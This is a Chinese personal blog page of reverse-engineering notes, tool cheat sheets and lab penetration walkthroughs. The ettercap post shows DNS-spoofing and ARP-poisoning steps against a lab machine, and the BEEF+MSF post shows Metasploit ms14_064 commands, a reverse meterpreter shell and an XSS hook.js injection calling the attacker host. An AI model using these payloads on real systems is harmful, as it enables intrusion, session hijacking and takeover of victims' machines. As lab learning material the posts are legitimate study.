        <h2 id="LoadPE"><a href="#LoadPE" class="headerlink" title="LoadPE"></a>LoadPE</h2><p>这款工具还是比较有名的，在刚学PE结构之前，就对这个工具有所了解，主要是简单的介绍一下配合OD和importREC的使用，在之后深入了解。<br>首先我们先对找到OEP的工具加载。<br><img src="img1.jpg" alt="LoadPE"><br>在这个列表框中找到我们所在的进程<br><img src="img2.jpg" alt="纠正镜像大小"><br>纠正一下镜像文件的大小，然后点击完全脱壳，会生成一个dump的文件。<br><img src="img9.jpg" alt="完全脱壳"><br>这款工具比较强大的其实是他的PE编辑器，我们之后再去讨论。</p>
<h2 id="import-REC"><a href="#import-REC" class="headerlink" title="import REC"></a>import REC</h2><p>这款工具是用来修复IAT的一些信息，由于这款工具可以自动找到我们的函数入口点之类的信息，所一比较方便，测试的软件加密的比较简单，所以不需要回OD进行查找，之后有机会和LoadPE一款演示。<br>言归正传，我们选择我们的进程。<br><img src="img3.jpg" alt="选择进程"><br>需要填写我哦们OEP的一个相对RAV，然后点击自动搜索IAT，获取输入表，再点击显示无效的函数，后对无效的函数进行cut掉就好了。<br><img src="img4.jpg" alt="获取IAT"><br>如果出现这个状况，我们一般通过OD进行确认一遍。<br>我们记住他返回给我们的RVA和size<br><img src="img5.jpg" alt="检查"><br>然后在OD中查看他的内容，dd就可以了，还可以看大一些提示信息。<br>import REC只是给我们以个大体的范围。<br>我们需要自己验证一下。<br><img src="img6.jpg" alt="验证"><br>我们，拖动字节为00的地方（一大片0的地方），然后看OD给我们指示的长度大小。<br><img src="img7.jpg" alt="验证"><br>与我们的import REC的结果相同，这个就很舒服了，嘻嘻。<br>回到我们的import REC，点击获取输入表。<br><img src="img8.jpg" alt="获取输入表"><br>这个时候就可以了，由于VB的程序比较特殊，输入表之类的都是自己搞的，和我们C++写的程序是有一些不同的。<br>我们点击修复抓取文件，选择哪个程序，他会生成一些  文件名_.exe的文件。<br><img src="img10.jpg" alt="修复完毕"><br>这个样子就脱壳完毕了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/13/LoadPE-and-importREC/" data-id="ck5xij35g0011e0wjee6756kr" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E6%B1%87%E7%BC%96%E5%B7%A5%E5%85%B7/" rel="tag">反汇编工具</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Common-Unshell" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/12/Common-Unshell/" class="article-date">
  <time datetime="2020-01-12T11:46:40.000Z" itemprop="datePublished">2020-01-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/12/Common-Unshell/">Common-Unshell</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="常见的脱壳方式"><a href="#常见的脱壳方式" class="headerlink" title="常见的脱壳方式"></a>常见的脱壳方式</h1><p>首先我们使用PEID进行查壳<br><img src="img1.jpg" alt="查壳"><br>发现是：ASPack 2.12 -&gt; Alexey Solodovnikov的壳，我们进行脱壳。</p>
<h2 id="单步跟进"><a href="#单步跟进" class="headerlink" title="单步跟进"></a>单步跟进</h2><p>其实这个方法就是最直接的，我们直接单步跟踪，向上的跳转在下一步按F4，指导跟踪到大的jmp，这样的关键性标识也有popad，但是这个一般要在一开始的程序入口点是pushad这个寄存机，例如：<br><img src="img2.jpg" alt="pushad"><br>我们一直跟踪，跟到这个地方。<br>但是下面有个call，我们单步步过的话呢，发现程序运行起来了，我们需要跟进。<br><img src="img3.jpg" alt="popad"><br>我们可以看到，我们运行到了popad，下面紧跟着跳转和retn，这个就很像了，我们继续运行。<br><img src="img4.jpg" alt="OEP"><br>可以看到这个retn就跳转到了我们的OEP，但是要记住删除代码分析，这个是一个比较明显的VB程序，而且我们的代码段回到了RAV1000的位置，这个时候我们用插件Dump出来。<br><img src="img5.jpg" alt="查壳"><br>确实是一个VB的程序。</p>
<h2 id="ESP定律"><a href="#ESP定律" class="headerlink" title="ESP定律"></a>ESP定律</h2><p>其实也就是ESP改变的时候我们下一个硬件断点，然后运行，ESP改变的时候程序暂停，我么单步跟下就可以了。<br><img src="img7.jpg" alt="HWESP"><br>然后我们运行（删除硬件断点不要忘记），会来到这个位置：<br><img src="img8.jpg" alt="OEPJmp"><br>可以看到确实快到了，我们但不跟踪几下就可以了。</p>
<h2 id="关键搜索"><a href="#关键搜索" class="headerlink" title="关键搜索"></a>关键搜索</h2><p>其实也就是搜索popad，记住不要搜索整个快，因为太大了，我们Ctrl+F进行搜索，会看到如下的结果：<br><img src="img9.jpg" alt="区段"><br>我们Ctrl+L就可以搜索下一个，记住一般来说，附近都有大的跳转和返回，一般也就是跨区段的跳转。</p>
<h2 id="二次镜像法"><a href="#二次镜像法" class="headerlink" title="二次镜像法"></a>二次镜像法</h2><p>首先我们对我们rsrc（资源）断下内存写入断点，这个就是进行解密，然后再对我们的code（代码）断进行下内存写入断点，这个样子就能到达我们的OEP了，具体操作如下：<br>点击M打开区段表。<br><img src="img10.jpg" alt="区段"><br>然后我们就会运行到这个位置：<br><img src="img11.jpg" alt="断下"><br>然后我们下我们code断点，然后运行。<br><img src="img12.jpg" alt="断下"><br>然后我们运行之后会运行到这个地方：<br><img src="img13.jpg" alt="OEPJmp"><br>然后就到我们熟悉的地方了。</p>
<h2 id="EIP跟踪法"><a href="#EIP跟踪法" class="headerlink" title="EIP跟踪法"></a>EIP跟踪法</h2><p>这个方法之前就了解了，使用OD的TC指令进行表达式计算，主要是找到我们的壳的区间，然后使用tc eip&lt;xxxxxxx，进行下端，tc这类的指令大家可以去看我的：<br><a href="https://wker666.github.io/2020/01/12/OD-QuickKeyBoard/" target="_blank" rel="noopener" title="OD快捷代码">https://wker666.github.io/2020/01/12/OD-QuickKeyBoard/</a><br>其实也就是对制定跟踪直到eip的位置到达了：<br><img src="img14.jpg" alt="区段"><br>我们按下Enter，然后运行，他会很慢的运行。<br>（不总么会用，之后深究一下）</p>
<h2 id="SFX跟踪法"><a href="#SFX跟踪法" class="headerlink" title="SFX跟踪法"></a>SFX跟踪法</h2><p>通过OD给我们的SFX（暂时还不知道这是个什么，应该是有点异常的意思，之后会出相关的知识学习）进行跟踪<br><img src="img15.jpg" alt="选项"><br>选择SFX，选择第二个选项（有点时候需要第三个，具体看情况）：<br><img src="img16.jpg" alt="选项"><br>然后重新启动程序，就会直接到达OEP，但记住要调回来哦。<br><img src="img17.jpg" alt="OEPJmp"></p>
<p><strong><strong><em>这是比较常见的一些脱壳技巧，之后还会更新。</em></strong></strong></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/12/Common-Unshell/" data-id="ck5xij34m0005e0wjd33i08dh" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%B1%E5%A3%B3%E7%AF%87/" rel="tag">脱壳篇</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-OD-QuickKeyBoard" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/12/OD-QuickKeyBoard/" class="article-date">
  <time datetime="2020-01-12T11:41:50.000Z" itemprop="datePublished">2020-01-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/12/OD-QuickKeyBoard/">OD-QuickKeyBoard</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>CALC :         判断表达式<br>WATCH :      添加监视表达式<br>AT :             在指定地址进行反汇编<br>FOLLOW :     跟随命令<br>ORIG :         反汇编于 EIP<br>DUMP           在指定地址进行转存<br>DA :            转存为反汇编代码<br>DB :            使用十六进制字节格式转存<br>DC :            使用 ASCII 格式转存<br>DD :            转存在堆栈格式<br>DU :            转存在 UNICODE 格式<br>DW :           使用十六进制字词格式转存<br>STK :          前往堆栈中的地址<br>AS  :          （AS + 地址 + 字符串） 在指定地址进行汇编<br>BP :             进行条件中断（有条件的断点）<br>BPX :           中断在全部调用 （Call）<br>BPD :           清除全部调用中的断点<br>BC :             清除断点<br>MR :             内存断点于访问时<br>MW :            内存断点于写入时<br>MD :             清除内存断点<br>HR :             访问时进行硬件中断<br>HW :            写入时进行硬件中断<br>HE :              执行时进行硬件中断<br>HD :              清除硬件断点<br>STOP :          停止运行程序调试<br>PAUSE :        暂停执行程序调试<br>RUN :            运行程序进行调试<br>GE :              运行和通过例外<br>SI :              单步进入 Call 中<br>SO :             步过 Call<br>TI :              跟踪进入直到地址<br>TO :            跟踪步过直到地址<br>TC :            跟踪进入直到满足条件<br>TOC :          跟踪步过直到满足条件<br>TR :            运行直到返回<br>TU :            运行直到用户代码<br>LOG :          查看记录窗口<br>MOD :         查看模块窗口<br>MEM :          查看内存窗口<br>CPU :           查看 CPU 窗口<br>CS :            查看 Call 堆栈<br>BRK :           查看断点窗口<br>OPT :           打开选项设置窗口<br>EXIT :          退出 OllyDbg<br>QUIT :          退出 OllyDbg<br>OPEN :         打开一个可执行文件<br>CLOSE :       关闭可执行文件  </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/12/OD-QuickKeyBoard/" data-id="ck5xij35o001be0wjgdt1ava2" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E6%B1%87%E7%BC%96%E5%B7%A5%E5%85%B7/" rel="tag">反汇编工具</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-MFC-LoadBitmap" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/11/MFC-LoadBitmap/" class="article-date">
  <time datetime="2020-01-11T02:53:16.000Z" itemprop="datePublished">2020-01-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/11/MFC-LoadBitmap/">MFC-LoadBitmap</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="MFC学习记录"><a href="#MFC学习记录" class="headerlink" title="MFC学习记录"></a>MFC学习记录</h1><p>今天在回头用Picture control这个控件的时候，发现出现一些错误，这里记录一下，不要以后踩坑了。<br>当我们要加载一幅位图时，我们要讲这个控件的Type属性设置为Bitmap，否则你将会一直加载不出位图，默认的只是加载一个无填充的矩形框。<br>下面是一些属性：</p>
<blockquote>
<p>Type属性</p>
<blockquote>
<p>Frame：显示一个无填充的矩形框，边框颜色可以通过Color属性的下拉列表设定<br>Etched Horz：显示一条横分割线<br>Etched Vert：显示一条竖分割线<br>Rectangle：显示一个填充的矩形框，矩形颜色可通过Color属性的下拉列表设定<br>Icon：显示一个图标（Icon），图标通过Image 下拉列表来设置图标资源ID<br>Bitmap：显示一个位图（Bitmap），位图通过Image 下拉列表来设置位图资源ID<br>Enhanced Metafile：显示一个加强的元数据文件（Metafile）<br>Owner Draw：自绘</p>
</blockquote>
</blockquote>
<p>并且在这里我们设置好后，如果我们要用MFC给我们的CBitmap类的话呢，可以直接使用图片的ID号，如果用LoadBitmap(Hinstance可以通过AfxGetApp()-&gt;m_hinstance获得)，我们的第二个参数要通过MAKEINTRESOURCE转换，而不是文件路径，LoadImage也有个坑也需要记录一下，LR_LOADFROMFILE这个才是加载文件到内存。常用的方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CBitmap bitmap;  &#x2F;&#x2F; CBitmap对象，用于加载位图   </span><br><span class="line">HBITMAP hBmp;    &#x2F;&#x2F; 保存CBitmap加载的位图的句柄   </span><br><span class="line">bitmap.LoadBitmap(IDB_BITMAP1);  &#x2F;&#x2F; 将位图IDB_BITMAP1加载到bitmap </span><br><span class="line">hBmp &#x3D; (HBITMAP)bitmap.GetSafeHandle();  &#x2F;&#x2F; 获取bitmap加载位图的句柄   </span><br><span class="line">m_jzmPicture.SetBitmap(hBmp);    &#x2F;&#x2F; 设置图片控件m_jzmPicture的位图图片为IDB_BITMAP1</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/11/MFC-LoadBitmap/" data-id="ck5xij35j0016e0wjc3dmfq3o" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MFC/" rel="tag">MFC</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-ettercap" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/08/ettercap/" class="article-date">
  <time datetime="2020-01-08T03:38:20.000Z" itemprop="datePublished">2020-01-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/08/ettercap/">ettercap</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>劫持内网数据包，强行更改DNS</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机：Kali(192.168.209.137)<br>靶机：32位XP(192.168.209.129)<br>我们使用ETTERCAP</p>
<p>ETTERCAP一款著名的嗅探劫持工具，比较好用的插件就要数DNS劫持和ARP欺骗了。<br>使用<strong><em>vim /etc/ettercap/etter.dns</em></strong>编辑我们的配置文件,在这之前，我们需要先规范我们的思路，在这里既然可以劫持DNS，</p>
<p>这个时候我们的ettercap就该上场了，我们首先设置我们的DNS劫持页面。<br><strong><em>vim /etc/ettercap/etter.dns</em></strong> 使用VIM进行编辑，也可以用自带的文本进行编辑。<br>将下面的这段文本找到并改为这个样子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">microsoft.com      A   107.170.40.56</span><br><span class="line">*.microsoft.com    A   107.170.40.56</span><br><span class="line">www.microsoft.com  PTR 107.170.40.56      # Wildcards in PTR are not allowed</span><br><span class="line">*				 A	 192.168.209.137   #这两条使我们添加的</span><br><span class="line">*				 PTR  192.168.209.137  #这两条使我们添加的</span><br></pre></td></tr></table></figure>
<p>我们打开劫持工具，首先设置我们的网卡：<br><img src="img1.jpg" alt="网卡设置"></p>
<p>设置好我们的网卡之后，我们扫描内网的机子，然后设置劫持，这里点击这两项：<br><img src="img2.jpg" alt="网卡设置"><br>我们会得到如下的几个IP：<br><img src="img3.jpg" alt="网卡设置"></p>
<p>首先.1的使我Win10的机子，.2是我的网关，.129是目标的机子，这个时候我们将.2的机子Add to Target1，.129的机子Add to Target2.<br>之后我们设置我们的ARP，根据我这个样子进行设置：</p>
<p><img src="img4.jpg" alt="网卡设置"></p>
<p>设置我之后我们选择插件进行执行了，选择</p>
<p><img src="img5.jpg" alt="网卡设置"></p>
<p>我们点击Start sniffing<br>然后我们在靶机上访问百度，会看到我们的结果：<br><img src="img6.jpg" alt="网卡设置"><br>并且我们的ettercap会收到如下的信息：<br><img src="img7.jpg" alt="网卡设置"></p>
<p>到此为止，我们的劫持就成功了，这是一种比较简单的方式，下章劫持我会介绍一下如何ARP欺骗的断网攻击，这样帮助我们在渗透测试网站的时候可以拿到C段就可以C段劫持。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/08/ettercap/" data-id="ck5xij36f001qe0wj30h5fv4r" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%97%85%E6%8E%A2%E5%8A%AB%E6%8C%81/" rel="tag">嗅探劫持</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-BEEF-MSF" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/06/BEEF-MSF/" class="article-date">
  <time datetime="2020-01-06T10:59:02.000Z" itemprop="datePublished">2020-01-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/06/BEEF-MSF/">BEEF+MSF</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>通过IE的漏洞提升我们的权限</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机：Kali(192.168.209.138)<br>靶机：32位XP(192.168.209.129)<br>我们使用BEEF+MSF</p>
<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>我们就可以联想到使用MSF的ms14_064_ole_code_execution脚本，他可以利用IE浏览器的漏洞，这里我们配置一下属性，他会生成一个URL给我们，具体配置如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;browser&#x2F;ms14_064_ole_code_execution &#x2F;&#x2F;使用064的脚本</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp  &#x2F;&#x2F;使用交互的shell</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set srvhost 192.168.209.137 &#x2F;&#x2F;设置主机</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set uripath &#x2F;</span><br><span class="line">上面这一句是设置我们的路径，这样设置就可以了</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set lhost 192.168.209.138  &#x2F;&#x2F;设置监听主机</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set AllowPowershellPrompt true</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; exploit &#x2F;&#x2F;开始执行</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.209.138:4444 </span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; [*] Using URL: http:&#x2F;&#x2F;192.168.209.138:8080&#x2F;</span><br><span class="line">[*] Server started.</span><br></pre></td></tr></table></figure>

<p>可以看到我们的监听端口未8080，也就是我们默认的端口号。</p>
<p>既然我们的监听端开启了，我们就来利用BEEF欺骗吧，首先打开我们的BEEF，这里说一下我的Kali没有自带，大家一样的话呢需要安装的。</p>
<p>打开BEEF之后会出现下面的页面：<br><img src="img1.jpg" alt="BEEF页面"></p>
<p>我们扫描一下目标网站的端口，发现开了80，打开网站，发现这么一个网址：</p>
<p><img src="img2.jpg" alt="网站页面"></p>
<p>发现是一个小论坛，我们猜测有XSS，这个时候我们提交我们的恶意JS代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC&#x3D;http:&#x2F;&#x2F;192.168.209.138:3000&#x2F;hook.js&gt;&lt;&#x2F;sCrIpT&gt;</span><br></pre></td></tr></table></figure>

<p>这是一个比较广泛的用法，我们提交上去，当管理员，打开这个链接的时候，管理员会看到如下的页面：<br><img src="img3.jpg" alt="管理员视野"></p>
<p>我们的BEEF上线了：<br><img src="img4.jpg" alt="BEEF上线页面"></p>
<p>忽略我之前测试的哪一个。<br>这个时候我们上线我们的MSF，<a href="http://192.168.209.138:8080" target="_blank" rel="noopener">http://192.168.209.138:8080</a><br>这个URL，使我们的MSF利用URL，我们使用BEEF的：Redirect Browser插件，将我们的页面强行重定向为我们的MSF页面，这个时候我们的Session就上线了：<br><img src="img5.jpg" alt="BEEF重定向"></p>
<p><img src="img6.jpg" alt="上线效果图"><br>这个时候我们使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i</span><br></pre></td></tr></table></figure>
<p>查看我们的session，如果和效果图一样，那说明我们拿到权限了，然后使用sessions 1来执行我们的shell，这个1是根据上线的ID号，从1开始排序的。<br>然后简单执行以下dir：<br><img src="img7.jpg" alt="MSF执行"><br><img src="img8.jpg" alt="MSF执行"><br>这个时候发现已经可以了，这个时候其实我们就已经达到了拿取Shell的目的。<br>我们还是可以配合ettercap进行劫持提权，这个留给大家自己去思考，不知道的可以参考我的关于ettercap的文章。<br>其实写这篇文章的过程有很多坎坷，中途XP无数次蓝屏，原因我的Windbg给搞的，希望大家多多关注。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/06/BEEF-MSF/" data-id="ck5xij34k0004e0wjce0kckw0" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E5%85%A5%E4%BE%B5/" rel="tag">内网入侵</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-脱壳学习1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/06/%E8%84%B1%E5%A3%B3%E5%AD%A6%E4%B9%A01/" class="article-date">
  <time datetime="2020-01-06T04:02:06.000Z" itemprop="datePublished">2020-01-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/06/%E8%84%B1%E5%A3%B3%E5%AD%A6%E4%B9%A01/">BeginToLearn-Unshell</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="脱壳学习"><a href="#脱壳学习" class="headerlink" title="脱壳学习"></a>脱壳学习</h1><h2 id="ESP定律"><a href="#ESP定律" class="headerlink" title="ESP定律"></a>ESP定律</h2><p>初学脱壳，之前学习了反汇编的知识，开始学习脱壳</p>
<p>最初接触的脱壳比较好用的就是ESP定律脱壳，方法比较简单，在ESP的值改变的时候给ESP下硬件的一个断点，比较方便的是：<br><img src="TK1/img1.jpg" alt="ESP断点"><br>我们点击运行，之后他一一般会断下，之后就会看到一些跳转，这些跳转中比较重要的是jmp跳转，jmp跳转之后我们但不跟过去，一般就是可以跳到我们的OEP位置<br><img src="TK1/img2.jpg" alt="ESP断点"><br><strong>这个时候可能会有向上的跳转，我们不分析太细节的话呢，我们直接在jmp上下断点，运行，让他直接到jmp，之后就会跳到OEP，主要要关注的是否是跨区段的跳转，如果是跨区段的跳转，并且跳转的结束位置是我们的代码区块，那么一般就到我们真正的OEP，但是可能出现OD将这段代码误认为ASCII码，所以我们需要删除分析或者分析代码，效果图如下：</strong><br><img src="TK1/img3.jpg" alt="ESP断点"></p>
<h1 id="Dump出脱壳文件"><a href="#Dump出脱壳文件" class="headerlink" title="Dump出脱壳文件"></a>Dump出脱壳文件</h1><p>这里可以简单的使用OD带的插件，如果不行的话呢用import REC，再不行我们就手动修改IAT使用loadPE，这里这个小程序我们使用OD的插件就可以了，具体操作如下：<br><img src="TK1/img4.jpg" alt="ESP断点"><br>这里注意，如果我们插件不行的话呢，我们需要取消勾选重建输入表，目的是为了我们能够在其他工具中重新建表，这样子生成的文件我们就能够方便调试了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/06/%E8%84%B1%E5%A3%B3%E5%AD%A6%E4%B9%A01/" data-id="ck5xij371001ze0wj9y3vhq05" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%B1%E5%A3%B3%E7%AF%87/" rel="tag">脱壳篇</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Hexo-Method" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/05/Hexo-Method/" class="article-date">
  <time datetime="2020-01-05T13:24:03.000Z" itemprop="datePublished">2020-01-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/05/Hexo-Method/">Hexo-Method</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Hexo语法"><a href="#Hexo语法" class="headerlink" title="Hexo语法"></a>Hexo语法</h1><p>文章持续更新</p>
<h2 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h2><p>新建一篇文章，先试用hexo new “title”新建一篇文章，使用hexo -g d命令部署发布。</p>
<h2 id="删除文章"><a href="#删除文章" class="headerlink" title="删除文章"></a>删除文章</h2><p>先删除你要删除的文章md文章，然后进行hexo -g d部署就可以了(别忘记删除文章的文件夹)<br>但是部署之后可能需要好几秒种之后才会在网站上刷新</p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>在我们想使用#的时候要注意，#后面我们需要加上一个空格，否则不会解析</p>
<h2 id="加入图片"><a href="#加入图片" class="headerlink" title="加入图片"></a>加入图片</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![你想输入的替代文字](xxxx&#x2F;图片名.jpg)</span><br><span class="line">这个图片要放在生成的文件的文件夹中，网上好多的方法不知道是不是错误的，反正我是不行，可能是编译器的问题吧</span><br></pre></td></tr></table></figure>
<p>测试效果如下：<br><img src="test/test.jpg" alt="测试的图片"></p>
<h2 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h2><p>使用&gt;可以设置我们的层次，可以多个&gt;多层次</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/05/Hexo-Method/" data-id="ck5xij350000he0wj7me9bexr" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android%E5%AD%A6%E4%B9%A0/" rel="tag">Android学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MFC/" rel="tag">MFC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Win32%E7%BC%96%E7%A8%8B/" rel="tag">Win32编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E5%85%A5%E4%BE%B5/" rel="tag">内网入侵</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E6%B1%87%E7%BC%96%E5%B7%A5%E5%85%B7/" rel="tag">反汇编工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%97%85%E6%8E%A2%E5%8A%AB%E6%8C%81/" rel="tag">嗅探劫持</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%84%B1%E5%A3%B3%E7%AF%87/" rel="tag">脱壳篇</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/Android%E5%AD%A6%E4%B9%A0/" style="font-size: 16.67px;">Android学习</a> <a href="/tags/Java/" style="font-size: 13.33px;">Java</a> <a href="/tags/MFC/" style="font-size: 10px;">MFC</a> <a href="/tags/Win32%E7%BC%96%E7%A8%8B/" style="font-size: 16.67px;">Win32编程</a> <a href="/tags/%E5%86%85%E7%BD%91%E5%85%A5%E4%BE%B5/" style="font-size: 10px;">内网入侵</a> <a href="/tags/%E5%8F%8D%E6%B1%87%E7%BC%96%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">反汇编工具</a> <a href="/tags/%E5%97%85%E6%8E%A2%E5%8A%AB%E6%8C%81/" style="font-size: 10px;">嗅探劫持</a> <a href="/tags/%E8%84%B1%E5%A3%B3%E7%AF%87/" style="font-size: 20px;">脱壳篇</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
